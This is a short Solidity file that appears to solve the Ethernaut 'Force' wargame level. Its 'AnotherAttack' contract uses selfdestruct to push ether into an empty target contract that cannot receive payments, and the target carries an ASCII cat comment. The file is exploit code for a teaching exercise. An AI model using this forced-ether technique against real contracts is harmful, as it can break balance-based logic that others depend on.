// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}

contract AnotherAttack {
    // Force force;
    function callForce(Force force) public payable returns (bool) {
      selfdestruct(payable(address(force)));
    }
}